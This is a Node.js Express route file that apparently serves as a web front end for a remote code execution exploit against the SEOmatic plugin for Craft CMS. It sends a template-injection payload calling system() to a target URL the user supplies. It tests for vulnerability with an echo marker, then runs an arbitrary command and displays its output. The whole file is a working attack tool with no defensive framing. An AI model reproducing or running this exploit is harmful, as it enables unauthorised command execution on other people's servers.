const express = require("express")
const router = express.Router()
const request = require("request")
const empty = (val) => {
    return val == undefined || val == '' || val == ' ' || val == null
}
const replace = (str, separator, replace) => {
    return str.split(separator).join(replace)
}
router.get("/seomatic", (req, res) => {
    res.render("rce", {
        url: "",
        output: ""
    })
})
router.post("/seomatic", (req, res) => {
    var url = req.body.target
    var command = req.body.command
    if (empty(url) || empty(command)) {
        res.render("rce", {url: url, output : "Fill the blank input"})
    }
    var command = replace(command, " ", "\\x20")
    const check = (url, command) => {
        request(`${url}/actions/seomatic/meta-container/meta-link-container/?uri={{"sep"}}{{craft.app.view.evaluateDynamicContent(%27print(system("echo\\x20seppwnedsep"));%27)}}{{"sep"}}`, function (error, response, body) {
            if (error) {
                 return res.render("rce", {
                     url: url,
                     output: "Something Wrong, pls try again"
                 })
            }
            if(response.statusCode == 200){
                var array = body.split("sep")
                for (let  i = 0; i < array.length; i++) {
                    const element = array[i];
                    if(element == "pwned"){
                        exploit(url, command)
                        break
                    }else if(i == array.length){
                        return res.render("rce", { url: url, output: "Not Vuln :(" })
                    }
                }
            }else{
                return res.render("rce", {
                    url: url,
                    output: "Not Vuln :("
                })
            }
        })
    }
    const exploit = (url, command) => {
        request(`${url}/actions/seomatic/meta-container/meta-link-container/?uri={{"s(op)ep"}}{{craft.app.view.evaluateDynamicContent(%27print(system("${command}"));%27)}}{{"s(op)ep"}}`, function (error, response, body) {
            if(error){
                return res.render("rce", { url: url, output: "Something Wrong" })
            }
            var array = body.split("s(op)ep")
            var output = array[1].split("\\n").join("<br>")
            return res.render("rce", {
                url: url,
                output: output
            })
        })
    }
    check(url, command)
})
module.exports = router
